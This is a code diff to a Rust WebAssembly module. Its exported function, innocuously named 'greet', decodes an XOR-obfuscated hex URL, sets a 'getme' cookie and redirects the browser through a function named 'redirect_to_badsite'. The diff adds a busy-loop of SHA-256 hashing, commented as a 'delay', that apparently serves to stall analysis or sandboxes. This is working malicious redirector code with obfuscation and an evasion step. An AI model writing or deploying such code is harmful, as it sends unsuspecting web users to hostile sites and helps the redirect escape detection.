@@ -1,6 +1,7 @@
 #![deny(unsafe_code)]
+use sha2::{Digest, Sha256};
 use wasm_bindgen::prelude::*;
-use web_sys::{window, HtmlDocument, Document, Location};
+use web_sys::{Document, HtmlDocument, Location, window};
 
 fn set_cookie() -> Result<(), JsValue> {
     let window = window().ok_or("no global window exists")?;
@@ -15,16 +16,15 @@ fn set_cookie() -> Result<(), JsValue> {
     );
     */
     let cookie: &'static str = "getme=redirected; max-age=86400; path=/; samesite=lax";
-    
+
     html_document.set_cookie(cookie)?;
     Ok(())
-
 }
 
 fn redirect_to_badsite(loc: &str) -> Result<(), JsValue> {
     let window = window().ok_or("no global window exists")?;
     let location: Location = window.location();
-    
+
     location.set_href(loc)?;
     Ok(())
 }
@@ -39,19 +39,30 @@ extern "C" {
 */
 
 fn decode_url(encoded_url: &str) -> Result<String, JsValue> {
-    let decoded_url = hex::decode(encoded_url).map_err(|_| JsValue::from_str("Invalid hex encoding"))?;
-    let decoded_bytes = decoded_url.into_iter().map(|x: u8| x^b'K').collect();
-    let decoded_url = String::from_utf8(decoded_bytes).map_err(|_| JsValue::from_str("Invalid UTF-8 sequence"))?;
-    if ! decoded_url.starts_with("http") {
+    let decoded_url =
+        hex::decode(encoded_url).map_err(|_| JsValue::from_str("Invalid hex encoding"))?;
+    let decoded_bytes = decoded_url.into_iter().map(|x: u8| x ^ b'K').collect();
+    let decoded_url = String::from_utf8(decoded_bytes)
+        .map_err(|_| JsValue::from_str("Invalid UTF-8 sequence"))?;
+    if !decoded_url.starts_with("http") {
         return Err(JsValue::from_str("Invalid Decoded URL"));
     }
     Ok(decoded_url)
 }
 
+fn delay() {
+    // This function is intentionally left empty to simulate a delay.
+    // In a real-world scenario, you might want to implement a more sophisticated delay mechanism.
+    let mut result = Sha256::digest(b"hello world");
+    while !(result[0] == 0x5d && result[1] == 0x5e && result[2] == 0x5f) {
+        result = Sha256::digest(result);
+    }
+}
 #[wasm_bindgen]
 pub fn greet(name: &str) -> Result<(), JsValue> {
     let decoded_url = decode_url(name)?;
     set_cookie()?;
+    delay();
     redirect_to_badsite(&decoded_url)?;
     Ok(())
 }
